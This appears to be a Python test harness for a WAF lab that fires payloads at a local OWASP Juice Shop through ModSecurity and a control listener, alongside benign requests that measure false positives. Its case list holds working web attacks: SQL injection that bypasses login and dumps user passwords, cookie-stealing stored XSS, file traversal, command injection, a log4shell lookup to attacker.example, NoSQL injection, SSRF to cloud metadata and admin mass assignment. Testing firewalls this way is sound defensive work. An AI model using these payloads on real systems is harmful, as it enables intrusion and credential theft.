#!/usr/bin/env python3
"""
Payload suite for the WAF lab.

Sends the same requests to two listeners and records what each one answered:

  control   http://localhost:9080   rule engine Off  (what the app does by itself)
  waf       http://localhost:8080   rule engine as set by the phase

A case counts as "exploited" when the control's response contains the marker
that proves the attack worked against the app, not merely that the request was
accepted. Every request carries an X-Case-Id header so summarise.py can join
the results to the ModSecurity audit log.

Usage: suite.py <phase-label>      results land in evidence/<phase-label>/results.jsonl
Standard library only.
"""
import http.client
import json
import os
import re
import sys
import time
import urllib.parse

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TARGETS = {"control": 9080, "waf": 8080}

JSON = "application/json"
FORM = "application/x-www-form-urlencoded"

# The seeded administrator in Juice Shop. Used only as the thing to steal.
ADMIN_EMAIL = "admin@juice-sh.op"


def q(s):
    """Percent-encode a query value the way a browser would."""
    return urllib.parse.quote(s, safe="")


# Each case: id, class, name, method, path, plus optional body, ctype, headers,
# auth (send the session token), marker (regex proving the attack worked on the
# app), and kind ("attack" or "normal"). {bid} and {item} are filled per session.
CASES = [
    # ---- SQL injection -----------------------------------------------------
    dict(id="S1", cls="sqli", name="login bypass (JSON body)",
         method="POST", path="/rest/user/login", ctype=JSON,
         body=json.dumps({"email": "' OR 1=1--", "password": "x"}),
         marker=r'"token"'),
    dict(id="S2", cls="sqli", name="UNION extraction (query)",
         method="GET",
         path="/rest/products/search?q=" + q(
             "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9',10 FROM Users--"),
         marker=ADMIN_EMAIL),
    dict(id="S3", cls="sqli", name="tautology (query)",
         method="GET",
         path="/rest/products/search?q=" + q("zzzz')) OR 1=1--"),
         marker=r"Apple Juice"),
    dict(id="S4", cls="sqli", name="tautology in a URL path",
         method="GET", path="/rest/products/zzzz'%20OR%201=1--/reviews"),

    # ---- Cross-site scripting ---------------------------------------------
    dict(id="X1", cls="xss", name="script tag (query)",
         method="GET", path="/rest/products/search?q=" + q("<script>alert(1)</script>")),
    dict(id="X2", cls="xss", name="stored script tag (JSON body)",
         method="PUT", path="/rest/products/1/reviews", ctype=JSON, auth=True,
         body=json.dumps({"message": "<script>alert(1)</script>", "author": "{email}"}),
         marker=r'"status":"success"'),
    dict(id="X3", cls="xss", name="stored event handler (JSON body)",
         method="PUT", path="/rest/products/1/reviews", ctype=JSON, auth=True,
         body=json.dumps({"message": "<img src=x onerror=alert(document.cookie)>",
                          "author": "{email}"}),
         marker=r'"status":"success"'),

    # ---- Traversal and file access ----------------------------------------
    dict(id="T1", cls="traversal", name="null byte file-type bypass (path)",
         method="GET", path="/ftp/eastere.gg%2500.md", marker=r"Congratulations"),
    dict(id="T2", cls="traversal", name="../ sequence (query)",
         method="GET", path="/rest/products/search?q=" + q("../../../../etc/passwd"),
         marker=r"root:"),

    # ---- Command injection and log4shell ----------------------------------
    dict(id="C1", cls="command", name="shell metacharacters (query)",
         method="GET", path="/rest/products/search?q=" + q(";cat /etc/passwd"),
         marker=r"root:"),
    dict(id="C2", cls="command", name="command substitution (query)",
         method="GET", path="/rest/products/search?q=" + q("$(id)"), marker=r"uid="),
    dict(id="C3", cls="command", name="log4shell lookup (header)",
         method="GET", path="/rest/products/search?q=apple",
         headers={"X-Api-Version": "${jndi:ldap://attacker.example/a}"}),

    # ---- NoSQL injection ----------------------------------------------------
    dict(id="J1", cls="nosql", name="$ne operator rewrites every review (JSON body)",
         method="PATCH", path="/rest/products/reviews", ctype=JSON, auth=True,
         body=json.dumps({"id": {"$ne": -1}, "message": "NoSQL was here"}),
         marker=r'"modified":[1-9]'),

    # ---- Server-side request forgery --------------------------------------
    dict(id="R1", cls="ssrf", name="cloud metadata address (form body)",
         method="POST", path="/profile/image/url", ctype=FORM, cookie=True,
         body="imageUrl=" + q("http://169.254.169.254/latest/meta-data/")),

    # ---- Scanner fingerprints ---------------------------------------------
    dict(id="U1", cls="scanner", name="sqlmap user agent",
         method="GET", path="/rest/products/search?q=apple",
         headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}),
    dict(id="U2", cls="scanner", name="Nikto user agent",
         method="GET", path="/rest/products/search?q=apple",
         headers={"User-Agent": "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:001)"}),

    # ---- Requests with no attack signature at all -------------------------
    dict(id="E1", cls="exposure", name="public signing key",
         method="GET", path="/encryptionkeys/jwt.pub", marker=r"BEGIN RSA PUBLIC KEY"),
    dict(id="E2", cls="exposure", name="open redirect",
         method="GET",
         path="/redirect?to=" + q("https://evil.example/?https://github.com/juice-shop/juice-shop"),
         marker=r"evil\.example"),
    dict(id="A1", cls="authz", name="read someone else's basket (BOLA)",
         method="GET", path="/rest/basket/1", auth=True, marker=r'"UserId":1,'),
    dict(id="A2", cls="authz", name="register as admin (mass assignment)",
         method="POST", path="/api/Users", ctype=JSON,
         body=json.dumps({"email": "{fresh}@lab.test", "password": "Lab!2026pass",
                          "passwordRepeat": "Lab!2026pass", "role": "admin"}),
         marker=r'"role":"admin"'),

    # ---- Legitimate traffic: any block here is a false positive -----------
    dict(id="N1", kind="normal", cls="normal", name="search for apple",
         method="GET", path="/rest/products/search?q=apple", marker=r"Apple Juice"),
    dict(id="N2", kind="normal", cls="normal", name="search with an ampersand",
         method="GET", path="/rest/products/search?q=" + q("juice & fruit"),
         marker=r'"status":"success"'),
    dict(id="N3", kind="normal", cls="normal", name="add to basket (POST)",
         method="POST", path="/api/BasketItems", ctype=JSON, auth=True,
         body=json.dumps({"ProductId": 1, "BasketId": "{bid}", "quantity": 1}),
         marker=r'"status":"success"', capture=("item", r'"id":(\d+),"ProductId"')),
    dict(id="N4", kind="normal", cls="normal", name="change quantity (PUT)",
         method="PUT", path="/api/BasketItems/{item}", ctype=JSON, auth=True,
         body=json.dumps({"quantity": 2}), marker=r'"quantity":2'),
    dict(id="N5", kind="normal", cls="normal", name="remove item (DELETE)",
         method="DELETE", path="/api/BasketItems/{item}", auth=True,
         marker=r'"status":"success"'),
    dict(id="N6", kind="normal", cls="normal", name="review with an ampersand and apostrophe",
         method="PUT", path="/rest/products/1/reviews", ctype=JSON, auth=True,
         body=json.dumps({"message": "Love it! A&B Juice, it's 5/5 and 100% worth it.",
                          "author": "{email}"}),
         marker=r'"status":"success"'),
    dict(id="N7", kind="normal", cls="normal", name="register with a strong password",
         method="POST", path="/api/Users", ctype=JSON,
         body=json.dumps({"email": "{fresh}@lab.test", "password": "P@ss'w0rd!\";--",
                          "passwordRepeat": "P@ss'w0rd!\";--"}),
         marker=r'"status":"success"'),
    dict(id="N8", kind="normal", cls="normal", name="log in with that password",
         method="POST", path="/rest/user/login", ctype=JSON,
         body=json.dumps({"email": "{last}@lab.test", "password": "P@ss'w0rd!\";--"}),
         marker=r'"token"'),

    dict(id="N9", kind="normal", cls="normal", name="download a public file",
         method="GET", path="/ftp/legal.md", marker=r"Legal Information"),
]


def send(port, case, ctx):
    """One request. Returns (status, text, headers) or (0, error, {})."""
    def fill(text):
        fresh = ctx.setdefault(
            "fresh_" + case["id"],
            ("u%d%s" % (int(time.time() * 1000) % 10**9, case["id"])).lower(),
        )
        return (text.replace("{bid}", str(ctx.get("bid", "")))
                    .replace("{item}", str(ctx.get("item", "")))
                    .replace("{email}", ctx.get("email", ""))
                    .replace("{fresh}", fresh)
                    .replace("{last}", ctx.get("last_fresh", "")))

    path = fill(case["path"])
    body = fill(case["body"]) if case.get("body") else None
    headers = {"X-Case-Id": case["id"], "User-Agent": "waf-lab-suite/1.0"}
    if case.get("ctype"):
        headers["Content-Type"] = case["ctype"]
    if case.get("auth") and ctx.get("token"):
        headers["Authorization"] = "Bearer " + ctx["token"]
    if case.get("cookie") and ctx.get("token"):
        headers["Cookie"] = "token=" + ctx["token"]
    for k, v in case.get("headers", {}).items():
        headers[k] = v
    try:
        conn = http.client.HTTPConnection("localhost", port, timeout=25)
        # putrequest/putheader keep the request target exactly as written; a
        # higher-level client would tidy %-escapes and dot segments away.
        conn.putrequest(case["method"], path, skip_host=False, skip_accept_encoding=True)
        for k, v in headers.items():
            conn.putheader(k, v)
        data = body.encode() if body is not None else None
        conn.putheader("Content-Length", str(len(data) if data else 0))
        conn.endheaders(data)
        resp = conn.getresponse()
        text = resp.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        conn.close()
        return resp.status, text, hdrs
    except Exception as exc:  # noqa: BLE001 - recorded, not hidden
        return 0, "ERROR %s" % exc, {}


def session(port, label):
    """Register and log in one ordinary customer on this listener."""
    ctx = {"email": "%s-%d@lab.test" % (label, int(time.time()))}
    pw = "Lab!2026pass"
    setup = dict(id="setup", method="POST", ctype=JSON)
    reg = dict(setup, path="/api/Users",
               body=json.dumps({"email": ctx["email"], "password": pw, "passwordRepeat": pw}))
    send(port, reg, ctx)
    login = dict(setup, path="/rest/user/login",
                 body=json.dumps({"email": ctx["email"], "password": pw}))
    status, text, _ = send(port, login, ctx)
    try:
        auth = json.loads(text)["authentication"]
        ctx["token"], ctx["bid"] = auth["token"], auth["bid"]
    except Exception:  # noqa: BLE001
        sys.exit("setup failed on port %d (status %d): %s" % (port, status, text[:120]))
    return ctx


def main():
    phase = sys.argv[1]
    outdir = os.path.join(LAB, "evidence", phase)
    os.makedirs(outdir, exist_ok=True)
    ctxs = {name: session(port, name) for name, port in TARGETS.items()}

    rows = []
    for case in CASES:
        row = {"id": case["id"], "class": case["cls"], "name": case["name"],
               "kind": case.get("kind", "attack")}
        for name, port in TARGETS.items():
            ctx = ctxs[name]
            status, text, hdrs = send(port, case, ctx)
            proof = text + " " + hdrs.get("location", "")
            if case.get("marker"):
                hit = bool(re.search(case["marker"], proof))
            else:
                hit = None  # nothing observable to prove either way
            row[name + "_code"] = status
            row[name + "_hit"] = hit
            if case.get("capture") and status < 300:
                m = re.search(case["capture"][1], text)
                if m:
                    ctx[case["capture"][0]] = m.group(1)
            if case["id"] == "N7":
                ctx["last_fresh"] = ctx.get("fresh_N7", "")
        rows.append(row)

    with open(os.path.join(outdir, "results.jsonl"), "w") as fh:
        for row in rows:
            fh.write(json.dumps(row) + "\n")
    print("wrote %d cases to evidence/%s/results.jsonl" % (len(rows), phase))


if __name__ == "__main__":
    main()
